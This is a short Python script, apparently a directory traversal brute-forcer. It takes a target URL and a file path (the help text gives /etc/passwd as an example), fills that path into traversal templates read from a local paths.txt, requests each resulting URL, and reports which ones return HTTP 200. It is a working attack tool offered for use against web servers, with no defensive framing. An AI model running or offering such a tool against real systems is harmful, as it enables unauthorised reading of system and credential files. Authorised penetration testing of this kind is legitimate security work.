#!/usr/bin/python

import requests
from colorama import Fore
import argparse

def file_reader():
    paths = open('paths.txt','r')
    return paths

def brute(url,file_path):
    hits = []
    paths = file_reader()
    for path in paths:
        path = path.strip()
        full_path = path.format(FILE=file_path)
        full_url = url + full_path
        res_code = requests.get(full_url)
        print(Fore.MAGENTA + "Trying URL path : ",full_url)
        if(res_code.status_code == 200):
            hits.append(full_url)
            print(Fore.GREEN + "hit on URL : ",full_url)
    return hits          



def main():
    parser = argparse.ArgumentParser(description="Directory Travarsal \n exaple : python directory_traverse.py --url https://exaple.com/ --path /etc/passwd")

    g1 = parser.add_argument_group("Group 1", "URL and path getter")

    g1.add_argument("--url",type=str,required=True, help="Provide URL for directory traversal e.g. https://exmple.com")

    g1.add_argument("--path",type=str, help="provide path for brute force e.g. etc/passwd")

    args = parser.parse_args()
    print(args.url,args.path)
	
    if args.url and args.path:
        hits = brute(args.url,args.path)
        print(Fore.GREEN + str(hits))
    else:
        print("Please provide url and path both")
	


if __name__ == '__main__':
    main()